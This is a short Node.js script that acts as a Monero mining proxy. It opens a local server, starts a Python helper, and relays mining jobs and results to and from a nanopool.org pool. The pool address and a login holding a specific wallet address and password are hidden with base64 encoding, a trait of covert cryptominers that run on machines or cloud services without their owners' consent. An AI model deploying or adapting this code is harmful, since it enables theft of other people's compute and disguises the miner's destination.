const { exec } = require('child_process')
const net = require('net')

let mClient = null
let mUser = null
let mJob = null

net.createServer(function(socket) {
    console.log('User Connected')

    mUser = socket

    if (mJob) {
        socket.write(mJob+'\r\n')
    }

    socket.on('data', function(data) {
        let result = data.toString()
        if (mClient) {
            mClient.write(result+'\r\n')
        }

        try {
            console.log(JSON.parse(result))
        } catch (error) {
            console.log(result)
        }
    })

    socket.on('error', () => {
        mUser = null
        console.log('User Disconnected')
    })
}).listen(9099, () => {  
    console.log('Server Start')

    let process = exec('python server.py')

    process.stdout.on('data', (data) => {
        let log = data.toString().trimStart().trimEnd()
        if (log.length > 0) {
            console.log(log.trim())
        }
    })
})


connectClient()

function connectClient() {
    const client = net.connect(10300, Buffer.from('eG1yLWFzaWExLm5hbm9wb29sLm9yZw==', 'base64').toString(), () => {
        mClient = client
        mJob = null
        client.write(Buffer.from('eyJtZXRob2QiOiJsb2dpbiIsInBhcmFtcyI6eyJsb2dpbiI6Ijg0QWJQbTJtQ2lCQ2gxODJnc3ZxU1JYTHBFYzlKZ1VKOTZ4M0tRNmgzNUVDRXRTek1XRkRhbU1kV0w5OHBXMTZ0ZjYxdkppdzM0bllmTWlpOGhUVzNwYlREQzdCcVRHIiwicGFzcyI6InJhaXlhbjA4OCIsInJpZ2lkIjoiIiwiYWdlbnQiOiJzdHJhdHVtLW1pbmVyLXB5LzAuMSJ9LCJpZCI6MX0=', 'base64').toString()+'\r\n')
    }).on('data', (data) => {
        try {
            let result = data.toString()
            if (mJob == null) {
                mJob = result
            }
            console.log('Job Receive...')
            if (mUser) {
                mUser.write(result+'\r\n')
            }
        } catch (error) {}
    }).on('end', () => {
        mClient = null
        mJob = null
        setTimeout(() => {
            connectClient()
        }, 2000)
    }).on('error', () => {
        mClient = null
        mJob = null
        setTimeout(() => {
            connectClient()
        }, 2000)
    })
}